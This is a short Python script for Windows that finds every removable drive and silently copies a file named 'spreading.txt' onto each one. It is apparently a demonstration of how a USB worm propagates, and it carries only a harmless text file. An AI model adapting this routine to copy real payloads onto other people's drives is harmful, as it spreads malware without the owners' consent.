import win32con
from win32api import GetLogicalDriveStrings
from win32file import GetDriveType
from shutil import copy

def getRemovableDrives(drive_types=(win32con.DRIVE_REMOVABLE,)):
    driveList = list()
    driveStr = GetLogicalDriveStrings()
    # print (driveStr)
    drives = [str(item)+'\\' for item in driveStr.split("\x00")]
    for drv in drives:
        if GetDriveType(drv) in drive_types:
            driveList.append(drv[:3])
    return driveList

def spreadIt():

    removable_drives = getRemovableDrives()
    filePath = "spreading.txt"
    if len(removable_drives) > 0:
        for pend in removable_drives:
            copy(filePath, pend)

# getRemovableDrives()
# print (getRemovableDrives())
spreadIt()
